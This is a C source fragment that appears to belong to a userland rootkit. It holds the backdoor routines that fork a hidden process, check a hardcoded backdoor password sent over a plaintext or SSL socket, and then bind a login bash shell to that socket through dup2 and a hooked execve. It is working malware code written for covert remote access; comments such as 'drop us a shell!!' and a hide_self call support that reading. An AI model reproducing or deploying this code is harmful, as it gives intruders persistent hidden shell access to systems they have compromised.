void spawn_shell(int sockfd){
    char *argv[3];

    argv[0] = BASH_PATH;
    argv[1] = LOGIN_FLAG;
    argv[2] = NULL;

    for(int i = 0; i < 3; i++) dup2(sockfd, i);
    chdir(INSTALL_DIR);
    system(PRE_SHELL);
    hook(CEXECVE);
    call(CEXECVE, argv[0], argv, NULL);    /* environment vars already set by is_bdusr() */
}

void backconnect(int method, int sockfd){
    char tmp[64];
    int got_pw;

    if(method == METHOD_PLAINTEXT){
        hook(CREAD);
        call(CREAD, sockfd, tmp, sizeof(tmp));   /* read input from new socket */
        tmp[strlen(tmp) - 1] = '\0';

        /* verify password is correct. */
#ifdef USE_CRYPT
        got_pw = !strncmp(BD_PWD, crypt(tmp, BD_PWD), strlen(BD_PWD));
#else
        got_pw = !strncmp(BD_PWD, tmp, strlen(BD_PWD));
#endif

        memset(tmp, 0, strlen(tmp));
        if(got_pw) spawn_shell(sockfd);  /* drop us a shell!! */
    }

#ifdef ACCEPT_USE_SSL
    if(method == METHOD_SSL){
        ctx = InitCTX();
        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sockfd);
        sockfd = SSL_get_fd(ssl);

        if(SSL_accept(ssl)){
            s_read(tmp);
            tmp[strlen(tmp) - 1] = '\0';

#ifdef USE_CRYPT
            got_pw = !strncmp(BD_PWD, crypt(tmp, BD_PWD), strlen(BD_PWD));
#else
            got_pw = !strncmp(BD_PWD, tmp, strlen(BD_PWD));
#endif

            memset(tmp, 0, strlen(tmp));
            if(got_pw) cmd_loop(sockfd);
            SSL_CTX_free(ctx);
        }
    }
#endif
}

int drop_shell(int method, int sockfd){
    if(fork() == 0){
        fsync(sockfd);
        setsid();      /* start our own session */
        hide_self();   /* hide this new process */
        backconnect(method, sockfd);
        close(sockfd);
        exit(0);
    }else{
        (void)close(sockfd);
        errno = ECONNABORTED;
        return -1;
    }

    return sockfd;
}